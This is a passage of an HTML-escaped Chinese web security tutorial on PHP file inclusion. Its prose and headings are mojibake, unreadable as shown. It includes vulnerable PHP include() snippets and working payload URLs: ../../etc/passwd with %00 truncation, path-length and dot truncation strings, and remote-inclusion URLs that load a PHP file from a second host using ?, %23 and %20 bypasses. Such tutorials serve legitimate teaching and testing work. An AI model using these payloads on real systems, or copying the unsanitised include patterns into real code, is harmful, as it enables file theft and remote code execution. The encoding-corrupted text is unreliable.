punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;æœ¬åœ°æ–‡ä»¶åŒ…å«&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æœ¬åœ°æ–‡ä»¶åŒ…å«&#34;&gt;#&lt;/a&gt; æœ¬åœ°æ–‡ä»¶åŒ…å«&lt;/h1&gt;
&lt;h2 id=&#34;æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«&#34;&gt;#&lt;/a&gt; æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«&lt;/h2&gt;
&lt;p&gt;è¿™ç§ç›´æ¥æ‰¾æˆ‘ä»¬åˆ°éœ€è¦çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡ŒåŒ…å«å°±è¡Œã€‚&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;ç¤ºä¾‹&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«&#34;&gt;#&lt;/a&gt; æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«&lt;/h2&gt;
&lt;p&gt;è¿™ç§ç±»å‹éœ€è¦æˆ‘ä»¬æ‰¾åˆ°çš„æ•æ„Ÿæ–‡ä»¶è·¯å¾„ï¼Œç„¶å&lt;ins class=&#34;info&#34;&gt;ç»•è¿‡é™åˆ¶&lt;/ins&gt;è¿›è¡ŒåŒ…å«å°±è¡Œã€‚&lt;/p&gt;
&lt;h3 id=&#34;00æˆªæ–­&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#00æˆªæ–­&#34;&gt;#&lt;/a&gt; %00 æˆªæ–­&lt;/h3&gt;
&lt;p&gt;æ¡ä»¶ï¼šmagic_quotes_gpc = Off php ç‰ˆæœ¬ &amp;lt; 5.3.4&lt;/p&gt;
&lt;p&gt;åœ¨ä¸Šé¢å¸¸è§ç¯å¢ƒä»£ç çš„åä¸¤ç§éƒ½å¾—ç”¨ %00 æˆªæ–­&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label warning&#34;&gt;ç¤ºä¾‹&lt;/span&gt;&lt;br /&gt;
 &lt;code&gt;http://www.xxx.com/xx.php?filename=../../etc/passwd%00&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;è·¯å¾„é•¿åº¦æˆªæ–­&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#è·¯å¾„é•¿åº¦æˆªæ–­&#34;&gt;#&lt;/a&gt; è·¯å¾„é•¿åº¦æˆªæ–­&lt;/h3&gt;
&lt;p&gt;æ¡ä»¶ï¼šwindows OSï¼Œç‚¹å·éœ€è¦é•¿äº 256ï¼›linux OS é•¿äº 4096&lt;/p&gt;
&lt;p&gt;Windows ä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º 256 å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼›&lt;/p&gt;
&lt;p&gt;Linux ä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º 4096 å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚&lt;/p&gt;
&lt;p&gt;æµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;tab&#34; data-id=&#34;id1&#34; data-title=&#34;EXP:&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dC8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8=&#34;&gt;http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img data-src=&#34;image008.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ç‚¹å·æˆªæ–­&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ç‚¹å·æˆªæ–­&#34;&gt;#&lt;/a&gt; ç‚¹å·æˆªæ–­&lt;/h3&gt;
&lt;p&gt;æ¡ä»¶ï¼šwindows OSï¼Œç‚¹å·éœ€è¦é•¿äº 256&lt;/p&gt;
&lt;p&gt;æµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;tab&#34; data-id=&#34;id2&#34; data-title=&#34;EXP:&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dA==&#34;&gt;http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt&lt;/span&gt;.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................&lt;/p&gt;
&lt;/div&gt;
&lt;h1 id=&#34;è¿œç¨‹æ–‡ä»¶åŒ…å«&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#è¿œç¨‹æ–‡ä»¶åŒ…å«&#34;&gt;#&lt;/a&gt; è¿œç¨‹æ–‡ä»¶åŒ…å«&lt;/h1&gt;
&lt;p&gt;PHP çš„é…ç½®æ–‡ä»¶ allow_url_fopen å’Œ allow_url_include è®¾ç½®ä¸º ONï¼Œinclude/require ç­‰åŒ…å«å‡½æ•°å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶ï¼Œå¦‚æœè¿œç¨‹æ–‡ä»¶æ²¡ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¯¼è‡´äº†æ‰§è¡Œæ¶æ„æ–‡ä»¶çš„ä»£ç ï¼Œè¿™å°±æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚&lt;/p&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;allow_url_fopen = Onï¼ˆæ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼‰&lt;br /&gt;
allow_url_include = Onï¼ˆæ˜¯å¦å…è®¸ include/require è¿œç¨‹æ–‡ä»¶ï¼‰&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«&#34;&gt;#&lt;/a&gt; æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«&lt;/h2&gt;
&lt;p&gt;å’Œæ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«å·®ä¸å¤šã€‚ä¸å†ä»‹ç»ï¼ˆæ‡’è›‹ã€‚ã€‚ï¼‰&lt;br /&gt;
&lt;img data-src=&#34;image009.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«&#34;&gt;#&lt;/a&gt; æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«&lt;/h2&gt;
&lt;p&gt;æµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;ä»£ç ä¸­å¤šæ·»åŠ äº† html åç¼€ï¼Œå¯¼è‡´è¿œç¨‹åŒ…å«çš„æ–‡ä»¶ä¹Ÿä¼šå¤šä¸€ä¸ª html åç¼€ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç»•è¿‡å§¿åŠ¿&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ç»•è¿‡å§¿åŠ¿&#34;&gt;#&lt;/a&gt; ç»•è¿‡å§¿åŠ¿&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;é—®å·ç»•è¿‡&lt;br /&gt;
 &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt?&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;image012.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;#å·ç»•è¿‡&lt;br /&gt;
 &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%23&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;image011.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç©ºæ ¼ (%20) ç»•è¿‡&lt;br /&gt;
 &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%20&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;image010.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;phpä¼ªåè®®&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpä¼ªåè®®&#34;&gt;#&lt;/a&gt; PHP ä¼ªåè®®&lt;/h1&gt;
&lt;p&gt;PHP å¸¦æœ‰å¾ˆå¤šå†…ç½® URL é£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼ fopen ()ã€ copy ()ã€ file_exists () å’Œ filesize () çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚ é™¤äº†è¿™äº›å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡ stream_wrapper_register () æ¥æ³¨å†Œè‡ªå®šä¹‰çš„å°è£…åè®®ã€‚&lt;/p&gt;
&lt;p&gt;æ”¯æŒçš„ç§ç±»æœ‰è¿™ 12 ç§&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;http:// â€” è®¿é—® HTTP (s) ç½‘å€&lt;/li&gt;
&lt;li&gt;ftp:// â€” è®¿é—® FTP (s) URLs&lt;/li&gt;
&lt;li&gt;php:// â€” è®¿é—®å„ä¸ªè¾“å…¥ / è¾“å‡ºæµï¼ˆI/O streamsï¼‰&lt;/li&gt;
&lt;li&gt;zlib:// â€” å‹ç¼©æµ&lt;/li&gt;
&lt;li&gt;data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰&lt;/li&gt;
&lt;li&gt;glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼&lt;/li&gt;
&lt;li&gt;phar:// â€” PHP å½’æ¡£&lt;/li&gt;
&lt;li&gt;ssh2:// â€” Secure Shell 2&lt;/li&gt;
&lt;li&gt;rar:// â€” RAR&lt;/li&gt;
&lt;li&gt;ogg:// â€” éŸ³é¢‘æµ&lt;/li&gt;
&lt;li&gt;expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ&lt;/li&gt;
